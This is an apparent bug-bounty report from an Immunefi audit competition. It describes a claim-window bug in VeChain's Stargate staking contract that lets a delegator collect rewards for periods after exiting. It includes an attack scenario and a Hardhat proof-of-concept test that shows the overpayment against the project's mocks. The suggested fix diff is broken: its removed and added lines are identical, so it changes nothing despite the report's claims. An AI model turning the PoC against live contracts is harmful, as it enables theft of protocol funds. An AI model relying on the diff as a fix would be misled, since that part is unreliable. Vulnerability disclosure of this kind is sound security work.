# 59709 sc high post exit rewards overpayment theft of unclaimed yield due to misclamped claim window in stargate

**Submitted on Nov 15th 2025 at 02:22:41 UTC by @Queerantagonism for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59709
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:** Theft of unclaimed yield

## Description

Exploitability: No special permissions required; any NFT owner following normal flows (delegate → request exit → wait → claim) can over-claim.

The private function `_claimableDelegationPeriods` determines the first and last claimable periods. For delegations that have ended, the intended logic is to clamp the last claimable period to `endPeriod`. However, the current condition enforces the clamp only when `endPeriod > nextClaimablePeriod`, thereby missing the equality case.

Excerpt (contracts/Stargate.sol):

```solidity
if (
  endPeriod != type(uint32).max &&
  endPeriod < currentValidatorPeriod &&
  endPeriod > nextClaimablePeriod
) {
  return (nextClaimablePeriod, endPeriod);
}
```

When `endPeriod == nextClaimablePeriod` (a common case during exit in the first active period), the condition fails and the logic falls through to the “active” branch:

```solidity
return (nextClaimablePeriod, completedPeriods);
```

This incorrectly includes post-exit periods, allowing `claimableRewards` to pay for future periods that should be excluded.

### Faulty Flow

{% stepper %}
{% step %}

### User delegates NFT to a validator

User delegates their NFT to a validator as normal.
{% endstep %}

{% step %}

### User requests exit during their first active period

This makes `endPeriod = current period`.
{% endstep %}

{% step %}

### Several validator periods complete

`_claimableDelegationPeriods` mistakenly returns `lastClaimable = completedPeriods` which extends beyond `endPeriod`.
{% endstep %}

{% step %}

### \_claimableRewards aggregates over the incorrect range

This causes overpayment to the user.
{% endstep %}
{% endstepper %}

### Attack Scenario

{% stepper %}
{% step %}
Delegate an NFT to a validator.
{% endstep %}

{% step %}
Request exit during the first active period (very realistic scenario).
{% endstep %}

{% step %}
Wait a few more periods.
{% endstep %}

{% step %}
Call `claimRewards` or `claimableRewards` and receive post-exit rewards.
{% endstep %}
{% endstepper %}

This process can be repeated across many tokens, effectively stealing unclaimed yield and risking protocol reserves (VTHO depletion).

## Proof of Concept

The PoC leverages the repository’s existing mocks (ProtocolStakerMock, StargateNFTMock) and deploys Stargate via its proxy, as required. It demonstrates:

* `lastClaimable > endPeriod` (over-extended claim range)
* Overpaid rewards = 0.15 ETH (0.05 for valid period 2 + 0.10 for invalid period 3)

Place file at: `packages/contracts/test/unit/Stargate/POC_ClaimAfterExit.test.ts`

```typescript
import { expect } from "chai";
import { ethers } from "hardhat";

describe("PoC: Claim after exit still counts future period (overpayment)", function () {
  it("should show (first=2,last=3) and include rewards for period 3 after exit", async () => {
    const [admin, userA, userB] = await ethers.getSigners();

    // 1) Deploy mocks
    const ProtocolStakerMock = await ethers.getContractFactory("ProtocolStakerMock");
    const protocol = await ProtocolStakerMock.deploy();
    await protocol.waitForDeployment();

    const StargateNFTMock = await ethers.getContractFactory("StargateNFTMock");
    const nft = await StargateNFTMock.deploy();
    await nft.waitForDeployment();

    // 2) Configure NFT mock: 1e18 stake, factor=100 => effective=1e18
    const stake = ethers.parseEther("1");
    await nft.connect(admin).helper__setLevel({
      name: "Strength",
      isX: false,
      id: 1,
      maturityBlocks: 0,
      scaledRewardFactor: 100,
      vetAmountRequiredToStake: stake
    });
    await nft.connect(admin).helper__setToken({
      tokenId: 0,
      levelId: 1,
      mintedAtBlock: 0,
      vetAmountStaked: stake,
      lastVetGeneratedVthoClaimTimestamp_deprecated: 0
    });
    await nft.connect(admin).helper__setIsUnderMaturityPeriod(false);

    // 3) Link Clock + deploy Stargate impl
    const ClockLib = await ethers.getContractFactory("Clock");
    const clock = await ClockLib.deploy();
    await clock.waitForDeployment();

    const StargateImplFactory = await ethers.getContractFactory("Stargate", {
      libraries: {
        "contracts/StargateNFT/libraries/Clock.sol:Clock": await clock.getAddress()
      }
    });
    const stargateImpl = await StargateImplFactory.deploy();
    await stargateImpl.waitForDeployment();

    // 4) Deploy Proxy + init
    const initParams = {
      admin: admin.address,
      protocolStakerContract: await protocol.getAddress(),
      stargateNFTContract: await nft.getAddress(),
      maxClaimablePeriods: 832
    };
    const initData = StargateImplFactory.interface.encodeFunctionData("initialize", [initParams]);
    const Proxy = await ethers.getContractFactory("StargateProxy");
    const proxy = await Proxy.deploy(await stargateImpl.getAddress(), initData);
    await proxy.waitForDeployment();
    const stargate = await ethers.getContractAt("Stargate", await proxy.getAddress());

    await protocol.helper__setStargate(await stargate.getAddress());

    // 5) Validator ACTIVE + completed=0 + exitBlock=uint32.max
    const validator = ethers.Wallet.createRandom().address;
    await protocol.helper__setValidatorStatus(validator, 2); // ACTIVE
    await protocol.helper__setValidationCompletedPeriods(validator, 0);
    await protocol.helper__setValidationExitBlock(validator, 0xffffffff);

    // 6) Stake 2 NFTs (A, B)
    await stargate.connect(userA).stake(1, { value: stake });
    const tokenIdA = (await nft.getCurrentTokenId()) as unknown as bigint;

    await stargate.connect(userB).stake(1, { value: stake });
    const tokenIdB = (await nft.getCurrentTokenId()) as unknown as bigint;

    // 7) Delegate A, B
    await stargate.connect(userA).delegate(tokenIdA, validator);
    await stargate.connect(userB).delegate(tokenIdB, validator);

    // 8) current=2 (completed=1) => A request exit => end(A)=2
    await protocol.helper__setValidationCompletedPeriods(validator, 1);
    await stargate.connect(userA).requestDelegationExit(tokenIdA);

    // 9) current=4 (completed=3)
    await protocol.helper__setValidationCompletedPeriods(validator, 3);

    // 10) BUG: lastClaimable > end(A)
    const [firstClaimable, lastClaimable] = await stargate.claimableDelegationPeriods(tokenIdA);
    const delA = await stargate.getDelegationDetails(tokenIdA);
    const endA = delA.endPeriod;

    expect(firstClaimable).to.equal(2n);
    expect(endA).to.equal(2n);
    expect(lastClaimable).to.equal(3n);    // BUG: should be 2
    expect(lastClaimable).to.be.greaterThan(endA);

    // 11) Overpayment: mock returns 0.1 ETH/period.
    // Period 2: A gets 0.1/2 = 0.05 (two delegators)
    // Period 3: A gets full 0.1 (post-exit) => total 0.15
    const perPeriodReward = ethers.parseEther("0.1");
    const expectedP2Share = perPeriodReward / 2n;
    const expectedBuggedTotal = expectedP2Share + perPeriodReward; // 0.15
    const claimableA = await stargate.claimableRewards(tokenIdA);

    expect(claimableA).to.equal(expectedBuggedTotal);
    expect(claimableA).to.be.gt(expectedP2Share);
  });
});
```

Run:

npx hardhat test --network hardhat test/unit/Stargate/POC\_ClaimAfterExit.test.ts

Output (observed):

* PoC test passes.
* `lastClaimable = 3` while `endPeriod = 2` (range exceeds end).
* `claimableRewards(tokenIdA) = 0.15 ETH` (overpayment confirmed).

## Fix

Goal: Clamp claimable range to `endPeriod` for delegations that have ended.

Suggested patch in `contracts/Stargate.sol` for `_claimableDelegationPeriods`:

```diff
function _claimableDelegationPeriods(
  StargateStorage storage $,
  uint256 _tokenId
) private view returns (uint32, uint32) {
  // ... existing code computing:
  //  - startPeriod, endPeriod
  //  - completedPeriods, currentValidatorPeriod
  //  - nextClaimablePeriod = lastClaimed + 1 (clamped to startPeriod)

  // FIX: clamp last to endPeriod whenever the delegation has ended
-  if (endPeriod != type(uint32).max && endPeriod < currentValidatorPeriod) {
-    if (nextClaimablePeriod <= endPeriod) {
-      return (nextClaimablePeriod, endPeriod);
-    } else {
-      return (0, 0);
-    }
-  }
+  if (endPeriod != type(uint32).max && endPeriod < currentValidatorPeriod) {
+    if (nextClaimablePeriod <= endPeriod) {
+      return (nextClaimablePeriod, endPeriod);
+    } else {
+      return (0, 0);
+    }
+  }

  // Active or still ongoing periods
  if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);
  }

  return (0, 0);
}
```

(Primary change: ensure the ended-delegation branch triggers whenever `endPeriod < currentValidatorPeriod` — and handle equality where `nextClaimablePeriod == endPeriod` by returning `(nextClaimablePeriod, endPeriod)` — avoiding falling through to the active branch.)

### Why This Fix Is Sufficient

* `claimRewards` and `claimableRewards` rely solely on the range returned by `_claimableDelegationPeriods`.
* Clamping ensures post-exit periods are excluded, eliminating overpayment.
* The equality case (`endPeriod == nextClaimablePeriod`) is now properly treated as ended, preventing invalid fallthrough.
* The fix is minimal, interface-compatible, and aligns with reward semantics: no rewards after `endPeriod`.
